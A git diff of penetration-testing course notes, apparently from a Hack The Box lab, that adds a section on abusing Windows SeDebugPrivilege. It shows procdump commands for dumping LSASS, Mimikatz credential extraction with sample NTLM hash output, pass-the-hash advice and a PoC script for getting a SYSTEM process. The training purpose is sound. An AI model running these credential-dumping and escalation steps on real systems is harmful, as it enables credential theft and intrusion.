@@ -2,7 +2,7 @@
 
 The below diagram walks through the Windows authorization and access control process at a high level, showing, for example, the process started when a user attempts to access a securable object such as a folder on a file share.
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.
 
@@ -106,4 +106,77 @@ nt authority\system
 
 _**Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt**_
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+## SeDebugPrivilege
+
+To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group.
+
+{% hint style="info" %}
+This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`.
+{% endhint %}
+
+After looking at the privileges of the user we just logged in an see that `SeDebugPrivilege` is listed
+
+We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to leverage this privilege and dump process memory.
+
+```cmd-session
+C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems
+
+```cmd-session
+C:\htb> mimikatz.exe
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+<SNIP> 
+Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 3/31/2021 2:59:52 PM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+        msv :
+         [00000003] Primary
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * NTLM     : cf3a5525ee9414229e66279623ed5c58
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+        tspkg :
+        wdigest :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        ssp :
+        credman :
+<SNIP>
+```
+
+{% hint style="info" %}
+Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager
+{% endhint %}
+
+<figure><img src="../../../.gitbook/assets/image (1477).png" alt=""><figcaption></figcaption></figure>
+
+### Remote Code Execution as SYSTEM
+
+We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it.
+
+First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) ([https://github.com/decoder-it/psgetsystem ](https://github.com/decoder-it/psgetsystem)) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.
+
+```powershell-session
+PS C:\htb> tasklist 
+winlogon.exe                   612 Console                    1     10,408 K
+```
+
+Note the PID, we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.
+
+<figure><img src="../../../.gitbook/assets/image (1478).png" alt=""><figcaption></figcaption></figure>
+
+Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`
